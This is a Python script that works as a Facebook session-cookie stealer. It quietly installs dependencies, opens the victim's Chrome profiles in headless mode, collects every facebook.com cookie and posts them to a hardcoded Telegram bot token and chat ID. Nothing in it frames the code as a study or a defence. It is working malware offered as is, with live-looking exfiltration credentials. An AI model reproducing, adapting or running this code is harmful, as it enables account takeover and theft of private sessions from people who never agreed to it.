import os
import sys
import subprocess
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import requests

TOKEN = '7533821284:AAGDsLUDpZYbfzdghq8QihpeHXfhzGIP43I'
CHAT_ID = '1174455752'
TELEGRAM_API = f'https://api.telegram.org/bot{TOKEN}/sendMessage'

def install_libraries():
    required_libs = ["requests", "webdriver_manager", "selenium"]
    subprocess.run([sys.executable, "-m", "ensurepip", "--upgrade"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for lib in required_libs:
        if subprocess.call([sys.executable, "-c", f"import {lib}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            subprocess.run([sys.executable, "-m", "pip", "install", lib, "--quiet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def check_chrome_installed():
    possible_paths = [
        os.path.join(os.getenv("ProgramFiles", "C:\\Program Files"), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(os.getenv("ProgramFiles(x86)", "C:\\Program Files (x86)"), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "Google", "Chrome", "Application", "chrome.exe"),
    ]
    if not any(os.path.exists(path) for path in possible_paths):
        sys.exit(1)

def get_cookies(profile_name):
    chrome_options = Options()
    chrome_options.add_argument(f"user-data-dir={os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data')}")
    chrome_options.add_argument(f"profile-directory={profile_name}")
    chrome_options.add_argument("--headless")
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
        driver.get('https://www.facebook.com/')
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        cookies = [c for c in driver.get_cookies() if 'facebook.com' in c['domain']]
        driver.quit()
        return cookies
    except:
        return None

def cookies_to_header_string(cookies):
    return "; ".join(f"{cookie['name']}={cookie['value']}" for cookie in cookies) if cookies else ""

def send_telegram(profile_cookies):
    message = "\n\n".join(f"Profile: {p}\n{cookies_to_header_string(c)}" for p, c in profile_cookies.items())
    try:
        requests.post(TELEGRAM_API, data={'chat_id': CHAT_ID, 'text': message}, timeout=5)
    except:
        pass

if __name__ == "__main__":
    install_libraries()
    check_chrome_installed()
    profiles = ["Default", "Profile 1", "Profile 2"]
    profile_cookies = {}
    for profile in profiles:
        cookies = get_cookies(profile)
        if cookies:
            profile_cookies[profile] = cookies
    send_telegram(profile_cookies)
